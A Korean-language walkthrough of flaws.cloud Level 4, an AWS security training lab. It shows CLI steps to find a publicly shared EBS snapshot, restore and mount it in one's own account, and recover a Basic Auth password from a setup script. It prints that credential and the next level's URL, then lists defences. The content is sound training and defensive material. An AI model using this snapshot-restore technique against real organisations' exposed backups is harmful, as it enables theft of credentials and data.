# Level 4 — 공개 EBS 스냅샷

> **URL**: http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud/
> **핵심 기술**: EC2 EBS 스냅샷 / 볼륨 복원 / HTTP Basic Auth
> **난이도**: ⭐⭐⭐
> **본인 AWS 계정 필요**: ✅ (볼륨·EC2 생성)

## 🎯 목표

이 레벨의 웹페이지는 **HTTP Basic Auth** 로 잠겨 있다. 그런데 힌트가 말한다: "**이 서버는 nginx 가 설정된 직후 EBS 스냅샷을 찍었다.**" 그 스냅샷은 실수로 **전 세계 공개** 되어 있다. 스냅샷을 복원하여 `.htpasswd` 를 꺼내고 Basic Auth 를 통과하는 것이 목표.

## 🧭 공식 힌트

<details>
<summary><b>Hint 1</b></summary>

> 이 페이지는 간단한 Basic Auth 로 보호돼 있습니다. 그런데 **운영자는 설치 직후 EBS 스냅샷을 찍어 두는 습관**이 있었나 봅니다.

</details>

<details>
<summary><b>Hint 2</b></summary>

> 공개된 스냅샷을 찾는 방법과, 내 계정에서 그것을 **복원** 하는 방법을 익혀야 합니다.

</details>

<details>
<summary><b>Hint 3</b></summary>

> `aws ec2 describe-snapshots --owner-ids <flaws 계정 ID>` 로 공개 스냅샷을 찾고, `create-volume` → `attach-volume` → `mount` 로 내부 파일을 읽어 보세요.

</details>

## 📚 사전 지식

- Level 3 에서 얻은 `flaws` 프로파일로 `get-caller-identity` 를 하면 **AWS 계정 ID** 가 나온다(`975426262029`).
- EBS 스냅샷은 `CreateVolumePermission` 에 `Group: all` 이 붙으면 전 세계 공개다.
- 공개 스냅샷으로부터 **복원은 본인 계정에서** 해야 한다(본인 리전에 볼륨을 만드는 행위).
- EC2 비용이 발생하므로 실습 후 **반드시 볼륨·EC2·스냅샷을 정리**하자.

## 🔍 정찰

### 1. flaws 계정 ID 확인
```bash
aws sts get-caller-identity --profile flaws
# "Account": "975426262029"
```

### 2. 해당 계정이 보유한 공개 스냅샷 나열
```bash
aws ec2 describe-snapshots \
  --owner-ids 975426262029 \
  --region us-west-2 \
  --profile flaws | jq '.Snapshots[] | {SnapshotId, StartTime, Description}'
```
예상:
```json
{
  "SnapshotId": "snap-0b49342abd1bdcb89",
  "StartTime": "2017-02-28T01:35:12+00:00",
  "Description": "Snapshot of flaws backup"
}
```

### 3. 공개 여부 확인
```bash
aws ec2 describe-snapshot-attribute \
  --snapshot-id snap-0b49342abd1bdcb89 \
  --attribute createVolumePermission \
  --region us-west-2 --profile flaws
# "CreateVolumePermissions": [ { "Group": "all" } ]   ← "all" = 전 세계 공개
```

> 💡 본인 프로파일(`myown`) 로 같은 명령을 해도 공개 스냅샷이므로 접근 가능하다.

## 🧨 취약점 원리

백업 목적으로 **프로덕션 서버의 EBS 디스크를 스냅샷**으로 찍어 두는 건 흔한 관행이다. 실수로 `--group-names all` 을 설정해 **전 세계 공유**하면, 공격자는:

1. 본인 계정에서 그 스냅샷으로 볼륨을 만든다 (**무료·무단**).
2. 자기 EC2 에 붙여서 마운트한다.
3. `/etc/` · `/home/` · `/root/` 에 있는 **설정 파일·스크립트·암호·키·DB 덤프**를 통째로 읽는다.

2023 년 이후 스냅샷은 "기본 비공개" 지만, 이전에 만들어 그대로 남은 스냅샷은 수백만 개에 달한다.

## 🛠 풀이

### 1. 본인 계정에서 볼륨 생성
```bash
aws ec2 create-volume \
  --region us-west-2 \
  --availability-zone us-west-2a \
  --volume-type gp3 \
  --snapshot-id snap-0b49342abd1bdcb89 \
  --profile myown
# VolumeId: vol-0abcdef1234567890
```

### 2. 같은 AZ 에 EC2 인스턴스(Amazon Linux 2023) 기동 후 attach
```bash
# 내 EC2 인스턴스 아이디를 I 라고 하면
aws ec2 attach-volume \
  --volume-id vol-0abcdef1234567890 \
  --instance-id i-0123456789abcdef0 \
  --device /dev/sdf \
  --profile myown --region us-west-2
```

### 3. 마운트 & 수색
```bash
ssh ec2-user@<my-ec2>
sudo mkdir /mnt/flaws
sudo mount /dev/xvdf1 /mnt/flaws     # OS에 따라 nvme1n1p1 등으로 이름이 다를 수 있음
ls /mnt/flaws/home/ubuntu
```
핵심 파일:
```bash
sudo cat /mnt/flaws/home/ubuntu/setupNginx.sh
```
출력 예:
```bash
#!/bin/bash
htpasswd -b /etc/nginx/.htpasswd flaws nCP8xigdjpjyiXgJ7nJu7rw5Ro68iE8M
```

### 4. Basic Auth 통과
```bash
curl -u 'flaws:nCP8xigdjpjyiXgJ7nJu7rw5Ro68iE8M' \
  http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud/
```
브라우저라면 `http://flaws:nCP8...@level4-....flaws.cloud/` 로 접속. 페이지에 다음 레벨 URL 이 적혀 있다.

### 5. 정리
```bash
aws ec2 detach-volume --volume-id vol-0abcdef1234567890 --profile myown --region us-west-2
aws ec2 delete-volume --volume-id vol-0abcdef1234567890 --profile myown --region us-west-2
# 사용한 EC2 도 terminate
```

## 🚪 정답 & 다음 레벨

<details>
<summary>정답 펼치기</summary>

- 자격증명: `flaws` / `nCP8xigdjpjyiXgJ7nJu7rw5Ro68iE8M`
- 다음 레벨: **http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/**
- 교훈: 백업은 **암호화 + 명시적 계정 공유** 를 기본으로. "Public" 옵션은 **리얼한 선택지가 아니라고 여겨야** 한다.

</details>

## 🌍 실제 세계 사례

- 2019 년 보안 연구자 Ben Morris 가 **Airtable·Dropbox·Nike** 등 대기업의 공개 EBS 스냅샷에서 프로덕션 DB 자격증명·개인 키·사내 이메일 원문을 찾아냈다 (DEF CON 27 발표).
- AWS 가 2023 년 스냅샷 기본 비공개를 만들면서 **Data Leak** 카테고리의 사고가 급격히 줄었다.

## 🛡 방어 대책

### ① 스냅샷을 절대 `all` 에 공유하지 않는다
```bash
aws ec2 modify-snapshot-attribute \
  --snapshot-id snap-xxx \
  --create-volume-permission 'Remove=[{Group=all}]' \
  --region us-west-2
```

### ② AWS Config 규칙
- `ebs-snapshot-public-restorable-check` — 공개 스냅샷 자동 탐지/경고.

### ③ 스냅샷 암호화 의무화
암호화된 스냅샷은 `Group: all` 이 **허용되지 않는다**. 즉 기본 암호화를 강제하면 이 취약점이 원천 차단된다.
```bash
aws ec2 enable-ebs-encryption-by-default --region us-west-2
```

### ④ SCP (Organizations 조직 단위)
```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "DenyPublicSnapshotSharing",
      "Effect": "Deny",
      "Action": "ec2:ModifySnapshotAttribute",
      "Resource": "*",
      "Condition": {
        "StringEquals": {
          "ec2:Add/group": "all"
        }
      }
    }
  ]
}
```

### ⑤ 민감한 비밀은 스냅샷이 아니라 Secrets Manager / Parameter Store 에
`setupNginx.sh` 같은 셸 스크립트에 평문으로 넣지 말고 `aws secretsmanager get-secret-value` 를 EC2 기동 시 IAM 역할로 가져오게 한다.

## ✅ 체크리스트

- [ ] 공개 스냅샷을 `describe-snapshots --owner-ids` 로 직접 찾음
- [ ] 본인 계정에서 볼륨 복원 → 마운트 → `setupNginx.sh` 에서 자격증명 회수
- [ ] 사용 후 볼륨·EC2 정리 (비용)
- [ ] 본인 계정에 `ebs-snapshot-public-restorable-check` Config 규칙 추가

## ⏭ 다음

[← Level 3](level-03.md) · [Level 5 →](level-05.md)
